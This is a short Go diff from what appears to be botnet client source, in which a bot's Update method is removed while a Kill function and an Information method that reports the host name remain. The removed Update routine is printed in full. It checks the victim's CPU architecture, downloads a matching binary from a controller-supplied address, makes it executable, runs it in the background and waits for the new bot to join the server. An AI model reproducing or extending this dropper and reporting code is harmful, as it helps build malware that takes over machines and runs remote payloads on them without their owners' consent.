@@ -83,22 +83,6 @@ func (b Bot) threadsNumber() string {
 
 func Kill() { syscall.Exit(0) }
 
-func (b *Bot) Update() {
-	if setCall, setKey := SetupCaller(); setKey {
-		defer Kill()
-		b.Report("START UPDATING...")
-		archChecker := execComd("tail", "-1", "/var/tmp/"+fileName(true))
-		if Find(archChecker, "[mips]") {
-			pullWeb(fileName(false), setCall.CallBot.MipsArch)
-		} else {
-			pullWeb(fileName(false), setCall.CallBot.DefaultArch)
-		}
-		execComd("chmod", "700", fileName(false))
-		go execComd("./"+fileName(false), "&")
-		time.Sleep(10 * time.Second) //Wait for bot to join the server.
-	}
-}
-
 func (b *Bot) Information() {
 	if _, setKey := SetupCaller(); setKey {
 		b.Report("Host Name: " + getHostname())
